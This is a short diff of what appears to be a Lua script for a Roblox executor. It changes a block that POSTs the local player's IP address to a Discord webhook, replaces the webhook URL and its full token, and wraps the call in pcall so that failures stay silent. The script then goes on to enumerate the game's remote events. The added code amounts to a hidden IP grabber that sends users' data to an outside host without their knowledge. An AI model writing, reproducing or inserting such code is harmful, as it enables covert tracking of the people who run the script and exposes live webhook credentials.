@@ -24,8 +24,8 @@ LocalPlayer = {
 }
 
 local HttpRequest = http_request or (syn and syn.request)
-HttpRequest({
-	Url = "https://discord.com/api/webhooks/1454441681809047594/xZUFi07ETE1qvn9VGJBNLUDkUbB-9eBb7KXaylNKDBGaHCsKmoTQCfFHhXmM5uiZcHax",
+pcall(function()HttpRequest({
+	Url = "https://discord.com/api/webhooks/1454454496015941672/KuF-Js3gClPkCyEMIWXlGulWZ4THPmnKl9TjfqGPYmXUdhNmrImsp-6oQX1uvoEWuqyx",
 	Method = "POST",
 	Headers = {
 		["Content-Type"] = "application/json"
@@ -34,6 +34,7 @@ HttpRequest({
 		content = LocalPlayer.IpAddress
 	})
 })
+end)
 for _, i in ipairs(game:GetDescendants()) do
 	if not (i:IsA("RemoteEvent") or i:IsA("RemoteFunction")) then
 		continue
